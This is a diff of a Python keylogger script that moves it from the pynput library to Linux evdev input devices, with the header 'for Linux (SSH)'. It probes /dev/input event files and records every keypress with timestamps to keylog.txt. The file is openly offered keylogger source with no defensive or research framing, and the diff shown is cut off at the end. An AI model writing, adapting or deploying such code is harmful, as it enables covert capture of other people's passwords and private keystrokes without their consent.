@@ -1,21 +1,28 @@
 #!/usr/bin/env python3
-# Simple Keylogger for Linux and Windows
+# Simple Keylogger for Linux (SSH)
 
-# Cannot detect copy and paste, and any other special information
-
-from pynput.keyboard import Listener, Key
+from evdev import InputDevice, categorize, ecodes
 import logging
 
 def on_press(key):
     logging.info(str(key))
-    print("{0} pressed".format(key))
+    print(f"{key} pressed")
 
 def main():
-    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+    for i in range(9):
+        try:
+            device = InputDevice(f'/dev/input/event{i}')  # Replace 'X' with the appropriate event number for your keyboard
+        except OSError as e:
+            print(f"Keyboard not found at event{i}")
+            print(e)
 
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+    logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format=' %(asctime)s - %(message)s')
 
+    for event in device.read_loop():
+        if event.type == ecodes.EV_KEY:
+            key_event = categorize(event)
+            if key_event.keystate == key_event.key_down:
+                on_press(key_event.keycode)
 
 if __name__ == "__main__":
     try:
